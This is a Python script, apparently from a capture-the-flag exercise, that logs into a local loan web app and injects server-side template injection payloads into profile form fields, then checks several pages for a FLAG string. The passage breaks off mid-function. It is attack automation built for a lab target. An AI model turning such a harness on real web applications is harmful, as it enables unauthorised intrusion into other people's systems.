import requests
import urllib.parse
import re
from typing import Dict, Any

BASE_URL = "http://127.0.0.1:5000"

def login() -> str:
    """Login and capture session cookie"""
    session = requests.Session()
    
    # Get login page first to see if CSRF token needed
    resp = session.get(f"{BASE_URL}/login")
    print(f"[*] Login page status: {resp.status_code}")
    
    # Attempt login
    login_data = {
        "username": "test",
        "password": "test"
    }
    
    resp = session.post(f"{BASE_URL}/login", data=login_data, allow_redirects=False)
    print(f"[*] Login POST status: {resp.status_code}")
    print(f"[*] Session cookie: {session.cookies.get('session')}")
    
    return session.cookies.get('session')

def test_ssti_payload(session_cookie: str, payload: str, field: str = "monthly_payment", 
                      description: str = "") -> Dict[str, Any]:
    """Test a single SSTI payload on the specified field"""
    
    print(f"\n{'='*80}")
    print(f"[TEST] {description}")
    print(f"[PAYLOAD] {field}={repr(payload)}")
    
    cookies = {"session": session_cookie}
    
    # Prepare profile data with payload in specified field
    profile_data = {
        "age": "25",
        "income": "50000",
        "monthly_payment": "1000",
        "email": "test@example.com"
    }
    
    # Inject payload into specified field
    profile_data[field] = payload
    
    # POST to /profile
    resp = requests.post(
        f"{BASE_URL}/profile",
        data=profile_data,
        cookies=cookies,
        allow_redirects=False
    )
    
    print(f"[RESPONSE] Status: {resp.status_code} | Length: {len(resp.content)}B")
    
    result = {
        "payload": payload,
        "field": field,
        "description": description,
        "status": resp.status_code,
        "flag_found": False,
        "response_preview": resp.text[:500] if len(resp.text) > 500 else resp.text
    }
    
    # Check for FLAG in immediate response
    flag_match = re.search(r'FLAG\{[^}]+\}', resp.text)
    if flag_match:
        print(f"[!!! FLAG FOUND !!!] {flag_match.group(0)}")
        result["flag_found"] = True
        result["flag_value"] = flag_match.group(0)
        result["flag_location"] = "profile_response"
        return result
    
    # If 302 redirect or 200, check other pages for execution
    if resp.status_code in [200, 302]:
        print(f"[*] Payload accepted, checking for execution...")
        
        # Check /loan_details
        resp_loan = requests.get(f"{BASE_URL}/loan_details", cookies=cookies)
        print(f"[CHECK] /loan_details - Status: {resp_loan.status_code} | Length: {len(resp_loan.content)}B")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp_loan.text)
        if flag_match:
            print(f"[!!! FLAG FOUND !!!] {flag_match.group(0)}")
            print(f"[FULL RESPONSE]\n{resp_loan.text}")
            result["flag_found"] = True
            result["flag_value"] = flag_match.group(0)
            result["flag_location"] = "/loan_details"
            return result
        
        # Check /home
        resp_home = requests.get(f"{BASE_URL}/home", cookies=cookies)
        print(f"[CHECK] /home - Status: {resp_home.status_code} | Length: {len(resp_home.content)}B")
        
        flag_match = re.search(r'FLAG\{[^}]+\}', resp_home.text)
        if flag_match:
            print(f"[!!! FLAG FOUND !!!] {flag_match.group(0)}")
            print(f"[FULL RESPONSE]\n{resp_home.text}")
            result["flag_found"] = True
            result["flag_value"] = flag_match.group(0)
